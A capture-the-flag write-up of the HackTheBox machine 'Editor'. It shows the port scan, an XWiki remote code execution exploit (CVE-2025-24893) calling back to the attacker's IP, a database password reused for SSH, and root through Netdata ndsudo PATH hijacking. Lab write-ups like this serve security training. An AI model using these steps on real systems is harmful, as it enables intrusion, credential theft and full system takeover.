---
title: HackTheBox — Editor  
date: 2026-01-08 00:00:00 +0800      
categories: [hackthebox machines]          
tags: [hackthebox]         
toc: true                           
comments: false                    
math: false                          
mermaid: false                
---

- **OS**: Linux
- **Difficulty**: Easy

![image-20260214031103838](assets/img/image-20260214031103838.png)

## Service Enumeration

**Port Scan Results**

```
└─$ sudo ~/nmapAutomator/nmapAutomator.sh 10.10.11.80 all                                
[sudo] password for kali: 

Running all scans on 10.10.11.80

Host is likely running Linux


---------------------Starting Port Scan-----------------------



PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy



---------------------Starting Script Scan-----------------------



PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editor.htb/
8080/tcp open  http    Jetty 10.0.20
| http-robots.txt: 50 disallowed entries (15 shown)
| /xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/ 
| /xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/ 
| /xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/ 
| /xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ /xwiki/bin/deleteversions/ 
| /xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/ 
|_/xwiki/bin/undelete/
| http-title: XWiki - Main - Intro
|_Requested resource was http://10.10.11.80:8080/xwiki/bin/view/Main/
|_http-server-header: Jetty(10.0.20)
| http-cookie-flags: 
|   /: 
|     JSESSIONID: 
|_      httponly flag not set
| http-methods: 
|_  Potentially risky methods: PROPFIND LOCK UNLOCK
|_http-open-proxy: Proxy might be redirecting requests
| http-webdav-scan: 
|   Server Type: Jetty(10.0.20)
|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK
|_  WebDAV type: Unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel



---------------------Starting Full Scan------------------------


PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy
```

## Initial Access — Unauthenticated Remote Code Execution in XWiki

```bash
└─$ echo '10.10.11.80    editor.htb' | sudo tee -a /etc/hosts
```

The web service on port 8080 exposes an XWiki version affected by **CVE-2025–24893**.

![xwiki version](https://cdn-images-1.medium.com/max/800/1*R35omcDxYF1AfjOQk-aUkA.png)

> [CVE-2025-24893/CVE-2025-24893.py at main · nopgadget/CVE-2025-24893](https://github.com/nopgadget/CVE-2025-24893/blob/main/CVE-2025-24893.py)

```
└─$ python3 exploit.py 10.10.11.80:8080 -i 10.10.14.24 -p 80
```

![image-20260214031108491](assets/img/image-20260214031108491.png)

Database credentials **xwiki:theEd1t0rTeam99** were discovered in the `hibernate.cfg.xml` configuration file.

```
xwiki@editor:/usr/lib/xwiki-jetty/webapps/xwiki/WEB-INF$ cat hibernate.cfg.xml | grep -i -C 3 password
```

```xml
    <property name="hibernate.connection.username">xwiki</property>
    <property name="hibernate.connection.password">theEd1t0rTeam99</property>
```

SSH into the server as oliver using the credentials **oliver:theEd1t0rTeam99**

```
└─$ ssh oliver@10.10.11.80
```

**user.txt value:**

```
oliver@editor:~$ cat user.txt 
<REDACTED>
```

## Privilege Escalation — ndsudo path hijacking

Netdata v1.45.2 is vulnerable to a path hijacking flaw, which could lead to privilege escalation.

```
oliver@editor:/opt/netdata$ /opt/netdata/bin/netdata -V
netdata v1.45.2
```

[https://github.com/netdata/netdata/security/advisories/GHSA-pmhq-4cxq-wj93](https://github.com/netdata/netdata/security/advisories/GHSA-pmhq-4cxq-wj93)

reference: [https://github.com/AzureADTrent/CVE-2024-32019-POC](https://github.com/AzureADTrent/CVE-2024-32019-POC)

```
└─$ gcc poc.c -o nvme                                         
                                                                                                                                                                                                                                                                                                                     
└─$ scp ~/nvme oliver@10.10.11.80:/tmp/nvme
```

get root shell

```bash
oliver@editor:/opt/netdata$ export PATH=/tmp:$PATH
oliver@editor:/opt/netdata$ /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
root@editor:/opt/netdata#
```

**root.txt value:**

```
root@editor:/root# cat root.txt 
<REDACTED>
```
